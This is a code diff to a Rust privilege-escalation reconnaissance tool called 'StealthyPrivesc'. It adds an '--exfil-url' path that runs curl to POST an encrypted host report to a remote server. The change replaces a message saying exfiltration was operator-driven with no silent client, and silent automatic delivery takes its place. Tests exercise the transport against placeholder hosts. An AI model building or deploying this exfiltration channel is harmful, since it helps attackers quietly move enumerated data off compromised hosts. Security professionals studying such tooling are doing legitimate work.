@@ -1,6 +1,8 @@
 use anyhow::{bail, Context, Result};
+use std::ffi::OsStr;
 use std::io::Write;
 use std::path::Path;
+use std::process::{Command, Stdio};
 use zeroize::Zeroize;
 
 use crate::cli::{OutputMode, ReportFormat};
@@ -139,18 +141,24 @@ pub fn emit(
                 .exfil_url
                 .as_ref()
                 .ok_or_else(|| anyhow::anyhow!("--output=remote requires --exfil-url"))?;
+            validate_remote_url(url)?;
             let sealed = store.seal_report(report)?;
             let key_path = opts.key_output_path.as_ref().expect("validated key path");
             let mut key = store.key_hex();
             let result = write_sensitive_file(key_path, key.as_bytes());
             key.zeroize();
             result?;
+            post_remote(url, &sealed).with_context(|| {
+                format!(
+                    "remote delivery failed; protected report key retained at {}",
+                    key_path.display()
+                )
+            })?;
             if !opts.quiet {
                 eprintln!(
-                    "{}\n  target: {}\n  POST body (base64 nonce||ciphertext):\n{}",
-                    term::warn("[remote] HTTPS exfil is operator-driven in v1 (no silent client)"),
-                    url,
-                    sealed
+                    "{} delivered encrypted report to {}",
+                    term::ok("[remote]"),
+                    url
                 );
                 eprintln!(
                     "{} wrote protected report key {}",
@@ -163,6 +171,94 @@ pub fn emit(
 
     let _ = (shown, total);
     Ok(EmitResult { max_severity })
+}
+
+pub(crate) fn validate_remote_url(url: &str) -> Result<()> {
+    if url.chars().any(char::is_whitespace) {
+        bail!("--exfil-url must not contain whitespace");
+    }
+    let scheme = url
+        .get(..8)
+        .filter(|scheme| scheme.eq_ignore_ascii_case("https://"));
+    if scheme.is_none() {
+        bail!("--exfil-url must use an absolute https:// URL");
+    }
+    let authority = url[8..].split(['/', '?', '#']).next().unwrap_or_default();
+    if authority.is_empty() {
+        bail!("--exfil-url must include a destination host");
+    }
+    Ok(())
+}
+
+fn post_remote(url: &str, sealed: &str) -> Result<()> {
+    post_remote_with(OsStr::new("curl"), url, sealed)
+}
+
+fn post_remote_with(program: &OsStr, url: &str, sealed: &str) -> Result<()> {
+    #[cfg(windows)]
+    const NULL_DEVICE: &str = "NUL";
+    #[cfg(not(windows))]
+    const NULL_DEVICE: &str = "/dev/null";
+
+    let mut child = Command::new(program)
+        .args([
+            "--proto",
+            "=https",
+            "--tlsv1.2",
+            "--fail",
+            "--silent",
+            "--show-error",
+            "--connect-timeout",
+            "10",
+            "--max-time",
+            "30",
+            "--request",
+            "POST",
+            "--header",
+            "Content-Type: application/octet-stream",
+            "--output",
+            NULL_DEVICE,
+            "--write-out",
+            "%{http_code}",
+            "--data-binary",
+            "@-",
+            url,
+        ])
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+        .context("start curl HTTPS client; install curl or use --output=file")?;
+    child
+        .stdin
+        .take()
+        .context("open curl request body")?
+        .write_all(sealed.as_bytes())
+        .context("write encrypted remote request body")?;
+    let output = child
+        .wait_with_output()
+        .context("wait for curl HTTPS client")?;
+    if !output.status.success() {
+        let detail = String::from_utf8_lossy(&output.stderr)
+            .trim()
+            .chars()
+            .take(512)
+            .collect::<String>();
+        let code = output.status.code().map_or_else(
+            || "terminated by signal".to_string(),
+            |code| code.to_string(),
+        );
+        if detail.is_empty() {
+            bail!("curl exited with status {code}");
+        }
+        bail!("curl exited with status {code}: {detail}");
+    }
+    let status = String::from_utf8_lossy(&output.stdout);
+    let status = status.trim();
+    if !matches!(status.parse::<u16>(), Ok(200..=299)) {
+        bail!("remote endpoint returned HTTP status {status}");
+    }
+    Ok(())
 }
 
 /// Render a JSON report with derived operator guidance fields.
@@ -295,18 +391,18 @@ pub fn render_html(report: &RunReport, findings: &[&Finding]) -> String {
     if body.is_empty() {
         body.push_str("<p class=empty>No findings match the current report.</p>");
     }
-    let paths = report
-        .attack_paths
-        .iter()
-        .map(|p| {
-            format!(
-                "<li><strong>{}</strong> — {} <small>(noise: {})</small></li>",
-                esc(&p.title),
-                esc(&p.summary),
-                esc(&p.estimated_noise)
-            )
-        })
-        .collect::<String>();
+    let mut paths = String::new();
+    for path in &report.attack_paths {
+        use std::fmt::Write as _;
+        write!(
+            &mut paths,
+            "<li><strong>{}</strong> — {} <small>(noise: {})</small></li>",
+            esc(&path.title),
+            esc(&path.summary),
+            esc(&path.estimated_noise)
+        )
+        .expect("writing HTML to a String cannot fail");
+    }
     format!("<!doctype html><meta charset=utf-8><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>StealthyPrivesc report</title><style>body{{font:15px system-ui;max-width:1000px;margin:2rem auto;padding:0 1rem;color:#172033;background:#f8fafc}}h1{{color:#0f766e}}.card{{border:1px solid #dbe4ee;background:white;border-radius:10px;padding:1rem;margin:1rem 0;box-shadow:0 2px 8px #0f172a0a}}.toolbar{{position:sticky;top:0;z-index:2;background:#fffffff2;backdrop-filter:blur(8px)}}.bar{{display:flex;gap:.6rem;align-items:center;margin:.45rem 0}}.bar span{{width:75px}}.bar i{{height:14px;border-radius:5px;display:inline-block;max-width:70%}}.bar b{{margin-left:.4rem}}details{{border-top:1px solid #dbe4ee;padding:.8rem}}summary{{cursor:pointer}}em{{font-style:normal;text-transform:uppercase;font-size:.75rem;color:#b45309}}code{{background:#f1f5f9;padding:.15rem .3rem;border-radius:4px;white-space:pre-wrap}}small{{color:#64748b}}button,input,select{{padding:.45rem;margin:.2rem;border:1px solid #cbd5e1;border-radius:6px;background:white}}button{{cursor:pointer}}.empty{{color:#64748b;padding:1rem}}</style><h1>StealthyPrivesc report</h1><div class=card><b>Host:</b> {} &nbsp; <b>User:</b> {} &nbsp; <b>OS:</b> {} / {}<br><b>Mode:</b> {} &nbsp; <b>Coverage:</b> {} &nbsp; <b>Plugins:</b> {}</div><div class=card><h2>Severity summary</h2>{bars}</div><div class=card><h2>Attack paths</h2><ul>{paths}</ul></div><div class=\"card toolbar\"><h2>Findings</h2><input id=search placeholder=\"Search findings\" aria-label=\"Search findings\"><select id=severity aria-label=\"Filter by severity\"><option value=\"\">All severities</option><option>critical</option><option>high</option><option>medium</option><option>low</option><option>info</option></select><button id=expand onclick=\"document.querySelectorAll('.finding').forEach(x=>x.open=true)\">Expand all</button><button onclick=\"document.querySelectorAll('.finding').forEach(x=>x.open=false)\">Collapse all</button>{body}</div><div class=card><h2>Coverage gaps</h2><p>{}</p></div><script>const apply=()=>{{const q=document.querySelector('#search').value.toLowerCase(),s=document.querySelector('#severity').value;document.querySelectorAll('.finding').forEach(x=>{{const text=x.textContent.toLowerCase(),sev=x.querySelector('em').textContent; x.style.display=(!q||text.includes(q))&&(!s||sev===s)?'':'none';}})}};document.querySelector('#search').oninput=apply;document.querySelector('#severity').onchange=apply;</script>", esc(&report.identity.hostname), esc(&report.identity.username), esc(&report.os.os), esc(&report.os.arch), esc(&report.mode), esc(&report.coverage_mode), report.plugins_run.len(), if report.capability_delta.is_empty() { "None reported".into() } else { report.capability_delta.iter().map(|x| format!("<code>{}</code>", esc(x))).collect::<Vec<_>>().join(", ") })
 }
 
@@ -938,5 +1034,62 @@ mod tests {
         assert!(path.exists());
         assert!(key.exists());
         assert!(dir.path().join("sealed.report.md").exists());
+    }
+
+    #[test]
+    fn remote_urls_require_https_and_a_host() {
+        assert!(validate_remote_url("https://operator.example/ingest").is_ok());
+        assert!(validate_remote_url("HTTPS://operator.example").is_ok());
+        for invalid in [
+            "http://operator.example/ingest",
+            "https://",
+            "https:///ingest",
+            "operator.example/ingest",
+            "https://operator.example/bad path",
+        ] {
+            assert!(validate_remote_url(invalid).is_err(), "accepted {invalid}");
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn remote_transport_enforces_success_and_does_not_echo_the_body() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let client = dir.path().join("curl-fixture");
+        let make_client = |script: &str| {
+            std::fs::write(&client, script).unwrap();
+            std::fs::set_permissions(&client, std::fs::Permissions::from_mode(0o700)).unwrap();
+        };
+        make_client("#!/bin/sh\n[ \"$(cat)\" = 'sealed-secret' ] || exit 64\nprintf '204'\n");
+        assert!(post_remote_with(
+            client.as_os_str(),
+            "https://fixture.invalid",
+            "sealed-secret"
+        )
+        .is_ok());
+
+        make_client("#!/bin/sh\ncat >/dev/null\nprintf '302'\n");
+        let error = post_remote_with(
+            client.as_os_str(),
+            "https://fixture.invalid",
+            "sealed-secret",
+        )
+        .unwrap_err()
+        .to_string();
+        assert!(error.contains("HTTP status 302"));
+
+        make_client("#!/bin/sh\ncat >/dev/null\necho 'fixture transport rejected' >&2\nexit 22\n");
+        let error = post_remote_with(
+            client.as_os_str(),
+            "https://fixture.invalid",
+            "sealed-secret",
+        )
+        .unwrap_err()
+        .to_string();
+        assert!(error.contains("status 22"));
+        assert!(error.contains("fixture transport rejected"));
+        assert!(!error.contains("sealed-secret"));
     }
 }
